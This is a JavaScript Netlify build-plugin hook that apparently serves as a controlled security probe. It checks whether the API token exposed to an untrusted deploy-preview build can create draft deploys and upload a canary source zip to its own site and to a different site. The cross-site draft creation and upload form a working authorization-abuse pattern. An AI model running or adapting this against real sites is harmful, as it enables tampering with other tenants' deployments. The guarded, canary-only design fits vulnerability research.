import { createHash } from 'node:crypto'

const API_ORIGIN = 'https://api.netlify.com'
const CONTROLLED_SITE_ID = '43a2f4e4-df31-455e-85bc-21f37fae92cd'
const CROSS_SITE_ID = '301d14a0-ba24-4dee-933f-d980b6c4cc17'
const BRANCH_PREFIX = 'bot/untrusted-preview-probe-'

const safeApiOrigin = (value) => {
  try {
    const url = new URL(/^https?:\/\//i.test(value || '') ? value : `https://${value || 'api.netlify.com'}`)
    return (
      url.origin === API_ORIGIN &&
      url.pathname === '/' &&
      !url.search &&
      !url.hash &&
      !url.username &&
      !url.password
    )
  } catch {
    return false
  }
}

const apiRequest = async (path, token, options = {}) => {
  const response = await fetch(new URL(path, API_ORIGIN), {
    ...options,
    headers: { authorization: `Bearer ${token}`, ...(options.headers || {}) },
    redirect: 'error',
    signal: AbortSignal.timeout(10_000),
  })
  let body = null
  if (response.headers.get('content-type')?.includes('application/json')) {
    try {
      body = await response.json()
    } catch {}
  } else {
    await response.body?.cancel()
  }
  return { status: response.status, ok: response.ok, body }
}

const crcTable = (() => {
  const table = new Uint32Array(256)
  for (let index = 0; index < 256; index += 1) {
    let value = index
    for (let bit = 0; bit < 8; bit += 1) {
      value = value & 1 ? 0xedb88320 ^ (value >>> 1) : value >>> 1
    }
    table[index] = value >>> 0
  }
  return table
})()

const crc32 = (buffer) => {
  let value = 0xffffffff
  for (const byte of buffer) value = crcTable[(value ^ byte) & 0xff] ^ (value >>> 8)
  return (value ^ 0xffffffff) >>> 0
}

const uint16 = (value) => {
  const buffer = Buffer.alloc(2)
  buffer.writeUInt16LE(value)
  return buffer
}

const uint32 = (value) => {
  const buffer = Buffer.alloc(4)
  buffer.writeUInt32LE(value >>> 0)
  return buffer
}

const createStoredZip = (contents) => {
  const name = Buffer.from('source-token-canary.txt')
  const data = Buffer.from(contents)
  const checksum = crc32(data)
  const local = Buffer.concat([
    uint32(0x04034b50), uint16(20), uint16(0), uint16(0), uint16(0), uint16(0),
    uint32(checksum), uint32(data.length), uint32(data.length), uint16(name.length), uint16(0), name, data,
  ])
  const central = Buffer.concat([
    uint32(0x02014b50), uint16(20), uint16(20), uint16(0), uint16(0), uint16(0), uint16(0),
    uint32(checksum), uint32(data.length), uint32(data.length), uint16(name.length), uint16(0), uint16(0),
    uint16(0), uint16(0), uint32(0), uint32(0), name,
  ])
  const end = Buffer.concat([
    uint32(0x06054b50), uint16(0), uint16(0), uint16(1), uint16(1),
    uint32(central.length), uint32(local.length), uint16(0),
  ])
  return Buffer.concat([local, central, end])
}

const safeUploadMetadata = (value) => {
  try {
    const url = new URL(value)
    const trusted =
      url.protocol === 'https:' &&
      url.hostname.endsWith('.amazonaws.com') &&
      url.searchParams.has('X-Amz-Signature')
    return {
      trusted,
      host: trusted ? url.hostname : null,
      pathSha256: trusted ? createHash('sha256').update(url.pathname).digest('hex') : null,
      expirySeconds: trusted ? Number(url.searchParams.get('X-Amz-Expires') || 0) : null,
      queryNames: trusted ? [...url.searchParams.keys()].sort() : [],
    }
  } catch {
    return { trusted: false, host: null, pathSha256: null, expirySeconds: null, queryNames: [] }
  }
}

const createDraft = async ({ siteId, token, reviewId, canary }) => {
  const create = await apiRequest(`/api/v1/sites/${siteId}/deploys`, token, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      draft: true,
      branch: `source-token-probe-${reviewId}`,
      include_upload_url: true,
    }),
  })
  const childDeployId = typeof create.body?.id === 'string' ? create.body.id : null
  const uploadUrl = typeof create.body?.source_zip_upload_url === 'string'
    ? create.body.source_zip_upload_url
    : null
  const upload = safeUploadMetadata(uploadUrl)
  const result = {
    createStatus: create.status,
    childDeployId,
    childState: typeof create.body?.state === 'string' ? create.body.state : null,
    sourceFilenamePresent: typeof create.body?.source_zip_filename === 'string',
    uploadCapabilityReturned: Boolean(uploadUrl),
    upload,
    uploadStatus: null,
    uploadedArchiveSha256: null,
  }

  if (uploadUrl && upload.trusted) {
    const archive = createStoredZip(canary)
    const response = await fetch(uploadUrl, {
      method: 'PUT',
      headers: {
        'content-type': 'application/zip',
        'content-length': String(archive.length),
      },
      body: archive,
      redirect: 'error',
      signal: AbortSignal.timeout(10_000),
    })
    result.uploadStatus = response.status
    result.uploadedArchiveSha256 = createHash('sha256').update(archive).digest('hex')
    await response.body?.cancel()
  }

  return result
}

export const onPostBuild = async ({ constants }) => {
  const token = constants.NETLIFY_API_TOKEN
  const deployId = process.env.DEPLOY_ID || ''
  const commitRef = process.env.COMMIT_REF || ''
  const reviewId = process.env.REVIEW_ID || ''

  let site = null
  let deploy = null
  if (safeApiOrigin(constants.NETLIFY_API_HOST) && typeof token === 'string' && token.length > 0) {
    try {
      ;({ body: site } = await apiRequest(`/api/v1/sites/${CONTROLLED_SITE_ID}`, token))
      ;({ body: deploy } = await apiRequest(`/api/v1/deploys/${deployId}`, token))
    } catch {}
  }

  const branch = typeof deploy?.branch === 'string' ? deploy.branch : ''
  const prerequisites = {
    deployPreview: process.env.CONTEXT === 'deploy-preview',
    controlledReview: /^\d+$/.test(reviewId),
    controlledSite: constants.SITE_ID === CONTROLLED_SITE_ID,
    controlledBranch: branch.startsWith(BRANCH_PREFIX),
    buildbotMode: constants.IS_LOCAL === false,
    trustedApiOrigin: safeApiOrigin(constants.NETLIFY_API_HOST),
    untrustedRedactPolicy: site?.build_settings?.untrusted_flow === 'redact',
    publicRepository: site?.build_settings?.public_repo === true,
    deployIdentityBound:
      deploy?.id === deployId &&
      deploy?.site_id === CONTROLLED_SITE_ID &&
      deploy?.context === 'deploy-preview' &&
      String(deploy?.review_id) === reviewId &&
      deploy?.commit_ref === commitRef,
    tokenPresent: typeof token === 'string' && token.length > 0,
  }

  const result = {
    schema: 'netlify-untrusted-source-upload-authorization-probe.v1',
    prerequisites,
    sameSite: null,
    crossSite: null,
    credentialValuesLogged: false,
    signedUrlsLogged: false,
    productionDeployRequested: false,
    syntheticOnly: true,
  }

  if (Object.values(prerequisites).every(Boolean)) {
    const canary = `source-token-probe-${reviewId}-${commitRef.slice(0, 12)}\n`
    try {
      result.sameSite = await createDraft({
        siteId: CONTROLLED_SITE_ID,
        token,
        reviewId,
        canary: `${canary}same-site\n`,
      })
      result.crossSite = await createDraft({
        siteId: CROSS_SITE_ID,
        token,
        reviewId,
        canary: `${canary}cross-site\n`,
      })
    } catch (error) {
      result.errorClass = error?.name || 'Error'
    }
  }

  console.log(`NETLIFY_UNTRUSTED_SOURCE_UPLOAD_AUTH ${JSON.stringify(result)}`)
}
